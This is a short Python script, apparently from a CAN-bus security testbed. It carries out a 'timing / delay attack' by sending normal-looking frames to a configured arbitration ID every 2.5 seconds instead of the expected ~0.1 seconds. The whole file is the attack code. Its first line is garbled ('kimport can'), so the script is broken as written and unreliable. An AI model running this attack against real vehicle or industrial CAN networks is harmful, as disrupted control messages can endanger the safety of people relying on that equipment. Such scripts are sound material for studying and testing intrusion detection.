kimport can
import time
from config.can_config import CAN_INTERFACE, CAN_CHANNEL, CAN_ID

bus = can.interface.Bus(
    channel=CAN_CHANNEL,
    interface=CAN_INTERFACE
)

print("[ATTACK] Timing / delay attack started")

try:
    while True:
        msg = can.Message(
            arbitration_id=CAN_ID,
            data=[40, 0, 0],  # normal-looking values
            is_extended_id=False
        )

        bus.send(msg)
        time.sleep(2.5)  # abnormal delay (normal ~0.1s)

except KeyboardInterrupt:
    print("\n[ATTACK] Timing attack stopped")

finally:
    bus.shutdown()
    print("[ATTACK] CAN bus closed cleanly")

